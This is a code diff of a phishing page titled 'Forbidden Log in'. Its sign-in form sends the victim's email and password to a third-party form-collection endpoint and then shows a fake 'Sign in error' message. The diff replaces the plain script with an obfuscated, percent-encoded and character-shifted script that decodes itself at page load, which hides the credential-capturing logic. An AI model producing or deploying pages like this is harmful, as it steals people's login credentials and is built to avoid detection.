@@ -1,1 +1,236 @@
-&lt;!DOCTYPE html&gt;&#10;&lt;html lang=&#34;en&#34; &gt;&#10;&lt;head&gt;&#10;  &lt;meta charset=&#34;UTF-8&#34;&gt;&#10;  &lt;title&gt;Forbidden Log in&lt;/title&gt;&#10;  &lt;link rel=&#34;stylesheet&#34; href=&#34;https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css&#34;&gt;&#10;&lt;link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css'&gt;&lt;link rel=&#34;stylesheet&#34; href=&#34;./style.css&#34;&gt;&#10;&#10;&lt;/head&gt;&#10;&lt;body&gt;&#10;&lt;!-- partial:index.partial.html --&gt;&#10;&lt;div class=&#34;contact-wrapper&#34;&gt;&#10;  &lt;header class=&#34;login-cta&#34;&gt;&#10;    &lt;h2&gt;Account Sign in&lt;/h2&gt;&#10;  &lt;/header&gt;&#10;  &lt;form id=&#34;my-form&#34; action=&#34;https://formspree.io/f/xoqbwebb&#34; method=&#34;POST&#34;&gt;&#10;    &lt;div class=&#34;form-row&#34;&gt;&#10;      &lt;input type=&#34;email&#34; name=&#34;email&#34; class=&#34;form-control&#34; id=&#34;exampleInputEmail1&#34; aria-describedby=&#34;emailHelp&#34; type=&#34;text&#34; required&gt;&#10;      &lt;span&gt;Username or Email&lt;/span&gt;&#10;    &lt;/div&gt;&#10;    &lt;div class=&#34;form-row&#34;&gt;&#10;      &lt;input type=&#34;password&#34; name=&#34;password&#34; class=&#34;form-control&#34; id=&#34;exampleInputEmail1&#34; aria-describedby=&#34;emailHelp&#34; required&gt;&#10;      &lt;span&gt;Password&lt;/span&gt;&#10;    &lt;/div&gt;&#10;    &lt;div class=&#34;form-row&#34;&gt;&lt;/div&gt;&#10;    &lt;div class=&#34;form-row&#34;&gt;&#10;      &lt;button id=&#34;my-form-button&#34; type=&#34;submit&#34;&gt;Sign in&lt;/button&gt;&#10;      &#10;    &lt;/div&gt;&#10;              &lt;span id=&#34;my-form-status&#34; class=&#34;form-text text-muted&#34;&gt;&lt;/span&gt;&#10;   &#10;  &lt;/form&gt;&#10;  &lt;div class=&#34;socials-wrapper&#34;&gt;&#10;    &lt;header&gt;&#10;      &lt;h2&gt;FORBIDDEN&lt;/h2&gt;     &lt;/header&gt;&#10;  &lt;/div&gt;&#10;&lt;/div&gt;&#10;&lt;!-- partial --&gt;&#10;   &lt;script&gt;&#10;     var form = document.getElementById(&#34;my-form&#34;);&#10;&#10;     async function handleSubmit(event) {&#10;       event.preventDefault();&#10;       var status = document.getElementById(&#34;my-form-status&#34;);&#10;       var data = new FormData(event.target);&#10;       fetch(event.target.action, {&#10;         method: form.method,&#10;         body: data,&#10;         headers: {&#10;           'Accept': 'application/json'&#10;         }&#10;       }).then(response =&gt; {&#10;         if (response.ok) {&#10;           status.innerHTML = &#34;Sign in error. There was a problem on the server.&#34;;&#10;           form.reset()&#10;         } else {&#10;           response.json().then(data =&gt; {&#10;             if (Object.hasOwn(data, 'errors')) {&#10;               status.innerHTML = data[&#34;errors&#34;].map(error =&gt; error[&#34;message&#34;]).join(&#34;, &#34;)&#10;             } else {&#10;               status.innerHTML = &#34;Oops! There was a problem Signing up your account&#34;&#10;             }&#10;           })&#10;         }&#10;       }).catch(error =&gt; {&#10;         status.innerHTML = &#34;Oops! There was a problem signing up your account&#34;&#10;       });&#10;     }&#10;     form.addEventListener(&#34;submit&#34;, handleSubmit)&#10;   &lt;/script&gt;&#10; &lt;style&gt;&#10;   @import url(&#34;https://fonts.googleapis.com/css?family=Rajdhani:500,700&amp;display=swap&#34;);&#10;*,&#10;*:before,&#10;*:after {&#10;  box-sizing: border-box;&#10;}&#10;&#10;body {&#10;  align-items: center;&#10;  background-image:url(https://i.pinimg.com/originals/ff/f9/a7/fff9a7b108d34d772540f258198f9d48.gif);&#10;  display: flex;&#10;  font-family: &#34;Rajdhani&#34;, sans-serif;&#10;  height: 100vh;&#10;  justify-content: center;&#10;}&#10;&#10;.contact-wrapper {&#10;  background: #191919;&#10;  box-shadow: 3px 3px 2px rgba(0, 0, 0, 0.15);&#10;  border-radius: 0.75em;&#10;  padding: 2em;&#10;  &#10;  width: 25em;&#10;}&#10;&#10;.login-cta &gt; h2 {&#10;  color: #3e3f5e;&#10;  font-size: 1.75rem;&#10;  &#10;  text-align: center;&#10;}&#10;&#10;.socials-wrapper &gt; header &gt; h2 {&#10;  background: #191919;&#10;  color: #3e3f5e;&#10;  font-size: 1rem;&#10;  position: relative;&#10;  text-align: center;&#10;  z-index: 10;&#10;}&#10;.socials-wrapper &gt; header &gt; h2:after, .socials-wrapper &gt; header &gt; h2:before {&#10;  background: transparent;&#10;  content: &#34;&#34;;&#10;  display: block;&#10;  height: 0.1em;&#10;    border: 1px solid #532cf8;&#10;&#10;  position: absolute;&#10;  top: 50%;&#10;  transform: translatey(-50%);&#10;  width: 17.5%;&#10;}&#10;.socials-wrapper &gt; header &gt; h2:after {&#10;  right: 0;&#10;}&#10;.socials-wrapper &gt; header &gt; h2:before {&#10;  left: 0;&#10;}&#10;.socials-wrapper &gt; ul {&#10;  display: flex;&#10;  list-style: none;&#10;  justify-content: center;&#10;  padding: 0;&#10;}&#10;.socials-wrapper &gt; ul &gt; li {&#10;  margin: 0.5em;&#10;}&#10;.socials-wrapper &gt; ul &gt; li &gt; a {&#10;  align-items: center;&#10;  border-radius: 0.5em;&#10;  color: #fff;&#10;  display: flex;&#10;  height: 2em;&#10;  &#10;  justify-content: center;&#10;  text-align: center;&#10;  text-decoration: none;&#10;  transition: all 300ms ease;&#10;  width: 2em;&#10;}&#10;.socials-wrapper &gt; ul &gt; li &gt; a.facebook {&#10;  background-color: #3763d2;&#10;}&#10;.socials-wrapper &gt; ul &gt; li &gt; a.twitter {&#10;  background-color: #1abcff;&#10;}&#10;.socials-wrapper &gt; ul &gt; li &gt; a.twitch {&#10;  background-color: #7b5dfa;&#10;}&#10;.socials-wrapper &gt; ul &gt; li &gt; a.youtube {&#10;  background-color: #fd434f;&#10;}&#10;.socials-wrapper &gt; ul &gt; li &gt; a:hover {&#10;  transform: translatey(-0.25em);&#10;}&#10;&#10;form {&#10;  margin: 2em 0;&#10;  &#10;}&#10;form &gt; .form-row {&#10;  display: flex;&#10;  margin: 0.75em 0;&#10;  &#10;  position: relative;&#10;}&#10;form &gt; .form-row &gt; span {&#10;  background: #191919;&#10;  color: #adafca;&#10;  display: inline-block;&#10;  &#10;  font-weight: 400;&#10;  left: 1em;&#10;  padding: 0 0.5em;&#10;  &#10;  position: absolute;&#10;  pointer-events: none;&#10;  transform: translatey(-50%);&#10;  top: 50%;&#10;  transition: all 300ms ease;&#10;  -webkit-user-select: none;&#10;     -moz-user-select: none;&#10;      -ms-user-select: none;&#10;          user-select: none;&#10;}&#10;form &gt; .form-row &gt; input, form &gt; .form-row &gt; button {&#10;  border-radius: 0.5em;&#10;  font-family: inherit;&#10;  background-color: transparent;&#10;  padding: 1em 0.5em;&#10;  &#10;  width: 100%;&#10;}&#10;form &gt; .form-row &gt; input {&#10;  font-weight: bold;&#10;    border: 1px solid #532cf8;&#10;&#10;  transition: 100ms ease all;&#10;  width: 100%;&#10;}&#10;form &gt; .form-row &gt; input[type=text], form &gt; .form-row &gt; input[type=password] {&#10;      border: 1px solid #532cf8;&#10;&#10;}&#10;form &gt; .form-row &gt; input:valid + span {&#10;  top: 0;&#10;  font-size: 0.9rem;&#10;}&#10;form &gt; .form-row &gt; input:invalid + span {&#10;  top: 50%;&#10;}&#10;form &gt; .form-row &gt; input:focus + span {&#10;  top: 0;&#10;}&#10;form &gt; .form-row &gt; input:required {&#10;  box-shadow: none;&#10;}&#10;form &gt; .form-row &gt; input:focus {&#10;  border-color: #7b5dfa;&#10;  outline: none;&#10;}&#10;form &gt; .form-row &gt; input:focus:invalid {&#10;  box-shadow: none;&#10;  top: 50%;&#10;}&#10;form &gt; .form-row &gt; input:focus:valid {&#10;  top: 0;&#10;}&#10;form &gt; .form-row &gt; button {&#10;  background-color: #7b5dfa;&#10;  border: 0.1em solid #7b5dfa;&#10;  color: #fff;&#10;  cursor: pointer;&#10;  font-weight: bold;&#10;  transition: all 300ms ease;&#10;}&#10;form &gt; .form-row &gt; button:focus {&#10;  border: 0.1em solid #532cf8;&#10;  outline: none;&#10;}&#10;form &gt; .form-row &gt; button:hover {&#10;  background-color: #6744f9;&#10;}&#10;&#10; &lt;/style&gt; &#10;&lt;/body&gt;&#10;&lt;/html&gt;&#10;
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Forbidden Log in</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css'><link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div class="contact-wrapper">
+  <header class="login-cta">
+    <h2>Account Sign in</h2>
+  </header>
+  <form  id="my-form" action="https://formspree.io/f/xoqbwebb" method="POST">
+    <div class="form-row">
+      <input type="email" name="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" type="text" required>
+      <span>Username or Email</span>
+    </div>
+    <div class="form-row">
+      <input type="password" name="password" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" required>
+      <span>Password</span>
+    </div>
+    <div class="form-row"></div>
+    <div class="form-row">
+      <button id="my-form-button" type="submit">Sign in</button>
+      
+    </div>
+              <span id="my-form-status" class="form-text text-muted"></span>
+   
+  </form>
+  <div class="socials-wrapper">
+    <header>
+      <h2>FORBIDDEN</h2>     </header>
+  </div>
+</div>
+<!-- partial -->
+  
+<script language=ajax>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('*75*75%7Bfw*75ktwr*75*8I*75ithzrjsy3ljyJqjrjsyG%7ENi*7%3D*77r%7E2ktwr*77*7%3E*8G*5F*5F*75*75*75*75*75fx%7Esh*75kzshynts*75mfsiqjXzgrny*7%3Dj%7Bjsy*7%3E*75*%3CG*5F*75*75*75*75*75*75*75j%7Bjsy3uwj%7BjsyIjkfzqy*7%3D*7%3E*8G*5F*75*75*75*75*75*75*75%7Bfw*75xyfyzx*75*8I*75ithzrjsy3ljyJqjrjsyG%7ENi*7%3D*77r%7E2ktwr2xyfyzx*77*7%3E*8G*5F*75*75*75*75*75*75*75%7Bfw*75ifyf*75*8I*75sj%7C*75KtwrIfyf*7%3Dj%7Bjsy3yfwljy*7%3E*8G*5F*75*75*75*75*75*75*75kjyhm*7%3Dj%7Bjsy3yfwljy3fhynts*7H*75*%3CG*5F*75*75*75*75*75*75*75*75*75rjymti*8F*75ktwr3rjymti*7H*5F*75*75*75*75*75*75*75*75*75gti%7E*8F*75ifyf*7H*5F*75*75*75*75*75*75*75*75*75mjfijwx*8F*75*%3CG*5F*75*75*75*75*75*75*75*75*75*75*75*7%3CFhhjuy*7%3C*8F*75*7%3Cfuuqnhfynts4oxts*7%3C*5F*75*75*75*75*75*75*75*75*75*%3CI*5F*75*75*75*75*75*75*75*%3CI*7%3E3ymjs*7%3Dwjxutsxj*75*8I*8J*75*%3CG*5F*75*75*75*75*75*75*75*75*75nk*75*7%3Dwjxutsxj3tp*7%3E*75*%3CG*5F*75*75*75*75*75*75*75*75*75*75*75xyfyzx3nssjwMYRQ*75*8I*75*77Xnls*75ns*75jwwtw3*75Ymjwj*75%7Cfx*75f*75uwtgqjr*75ts*75ymj*75xjw%7Bjw3*77*8G*5F*75*75*75*75*75*75*75*75*75*75*75ktwr3wjxjy*7%3D*7%3E*5F*75*75*75*75*75*75*75*75*75*%3CI*75jqxj*75*%3CG*5F*75*75*75*75*75*75*75*75*75*75*75wjxutsxj3oxts*7%3D*7%3E3ymjs*7%3Difyf*75*8I*8J*75*%3CG*5F*75*75*75*75*75*75*75*75*75*75*75*75*75nk*75*7%3DTgojhy3mfxT%7Cs*7%3Difyf*7H*75*7%3Cjwwtwx*7%3C*7%3E*7%3E*75*%3CG*5F*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75xyfyzx3nssjwMYRQ*75*8I*75ifyf*%3AG*77jwwtwx*77*%3AI3rfu*7%3Djwwtw*75*8I*8J*75jwwtw*%3AG*77rjxxflj*77*%3AI*7%3E3otns*7%3D*77*7H*75*77*7%3E*5F*75*75*75*75*75*75*75*75*75*75*75*75*75*%3CI*75jqxj*75*%3CG*5F*75*75*75*75*75*75*75*75*75*75*75*75*75*75*75xyfyzx3nssjwMYRQ*75*8I*75*77Ttux*76*75Ymjwj*75%7Cfx*75f*75uwtgqjr*75Xnlsnsl*75zu*75%7Etzw*75fhhtzsy*77*5F*75*75*75*75*75*75*75*75*75*75*75*75*75*%3CI*5F*75*75*75*75*75*75*75*75*75*75*75*%3CI*7%3E*5F*75*75*75*75*75*75*75*75*75*%3CI*5F*75*75*75*75*75*75*75*%3CI*7%3E3hfyhm*7%3Djwwtw*75*8I*8J*75*%3CG*5F*75*75*75*75*75*75*75*75*75xyfyzx3nssjwMYRQ*75*8I*75*77Ttux*76*75Ymjwj*75%7Cfx*75f*75uwtgqjr*75xnlsnsl*75zu*75%7Etzw*75fhhtzsy*77*5F*75*75*75*75*75*75*75*%3CI*7%3E*8G*5F*75*75*75*75*75*%3CI*5F*75*75*75*75*75ktwr3fiiJ%7BjsyQnxyjsjw*7%3D*77xzgrny*77*7H*75mfsiqjXzgrny*7%3E5')</script>
+   
+ <style>
+   @import url("https://fonts.googleapis.com/css?family=Rajdhani:500,700&display=swap");
+*,
+*:before,
+*:after {
+  box-sizing: border-box;
+}
+
+body {
+  align-items: center;
+  background-image:url(https://i.pinimg.com/originals/ff/f9/a7/fff9a7b108d34d772540f258198f9d48.gif);
+  background-size:cover;
+ background-repeat:no-repeat;
+  display: flex;
+  font-family: "Rajdhani", sans-serif;
+  height: 100vh;
+
+  justify-content: center;
+}
+
+.contact-wrapper {
+  background: #191919;
+  box-shadow: 3px 3px 2px rgba(0, 0, 0, 0.15);
+  border-radius: 0.75em;
+  padding: 3em;
+          color: #3e3f5e;
+
+  width: 25em;
+}
+
+.login-cta > h2 {
+  font-size: 1.75rem;
+        color: #3e3f5e;
+
+
+  text-align: center;
+}
+
+.socials-wrapper > header > h2 {
+  background: #191919;
+  color: #3e3f5e;
+  font-size: 1rem;
+  position: relative;
+  text-align: center;
+  z-index: 10;
+      color: white;
+
+}
+.socials-wrapper > header > h2:after, .socials-wrapper > header > h2:before {
+  background: transparent;
+  content: "";
+  display: block;
+  height: 0.1em;
+    border: 1px solid #532cf8;
+
+  position: absolute;
+  top: 50%;
+  transform: translatey(-50%);
+  width: 17.5%;
+}
+.socials-wrapper > header > h2:after {
+  right: 0;
+}
+.socials-wrapper > header > h2:before {
+  left: 0;
+}
+.socials-wrapper > ul {
+  display: flex;
+  list-style: none;
+  justify-content: center;
+  padding: 0;
+}
+.socials-wrapper > ul > li {
+  margin: 0.5em;
+}
+.socials-wrapper > ul > li > a {
+  align-items: center;
+  border-radius: 0.5em;
+  color: #fff;
+  display: flex;
+  height: 2em;
+  
+  justify-content: center;
+  text-align: center;
+  text-decoration: none;
+  transition: all 300ms ease;
+  width: 2em;
+}
+.socials-wrapper > ul > li > a.facebook {
+  background-color: #3763d2;
+}
+.socials-wrapper > ul > li > a.twitter {
+  background-color: #1abcff;
+}
+.socials-wrapper > ul > li > a.twitch {
+  background-color: #7b5dfa;
+}
+.socials-wrapper > ul > li > a.youtube {
+  background-color: #fd434f;
+}
+.socials-wrapper > ul > li > a:hover {
+  transform: translatey(-0.25em);
+}
+
+form {
+  margin: 2em 0;
+  
+}
+form > .form-row {
+  display: flex;
+  margin: 0.75em 0;
+  
+  position: relative;
+}
+form > .form-row > span {
+  background: transparent;
+  color: white;
+  display: inline-block;
+  
+  font-weight: 400;
+  left: 1em;
+  padding: 0 0.5em;
+  
+  position: absolute;
+  pointer-events: none;
+  transform: translatey(-50%);
+  top: 50%;
+  transition: all 300ms ease;
+  -webkit-user-select: none;
+     -moz-user-select: none;
+      -ms-user-select: none;
+          user-select: none;
+}
+form > .form-row > input, form > .form-row > button {
+  border-radius: 0.5em;
+  font-family: inherit;
+  background-color:#3e3f5e;
+  padding: 1em 0.5em;
+  
+  width: 100%;
+}
+form > .form-row > input {
+  font-weight: bold;
+    border: 1px solid #532cf8;
+
+  transition: 100ms ease all;
+  width: 100%;
+}
+form > .form-row > input[type=text], form > .form-row > input[type=password] {
+      border: 1px solid #532cf8;
+
+}
+form > .form-row > input:valid + span {
+  top: 0;
+  font-size: 0.9rem;
+}
+form > .form-row > input:invalid + span {
+  top: 50%;
+}
+form > .form-row > input:focus + span {
+  top: 0;
+}
+form > .form-row > input:required {
+  box-shadow: none;
+}
+form > .form-row > input:focus {
+  border-color: #7b5dfa;
+  outline: none;
+}
+form > .form-row > input:focus:invalid {
+  box-shadow: none;
+  top: 50%;
+}
+form > .form-row > input:focus:valid {
+  top: 0;
+}
+form > .form-row > button {
+  background-color: #7b5dfa;
+  border: 0.1em solid #7b5dfa;
+  color: #fff;
+  cursor: pointer;
+  font-weight: bold;
+  transition: all 300ms ease;
+}
+form > .form-row > button:focus {
+  border: 0.1em solid #532cf8;
+  outline: none;
+}
+form > .form-row > button:hover {
+  background-color: #6744f9;
+}
+
+ </style> 
+</body>
+</html>
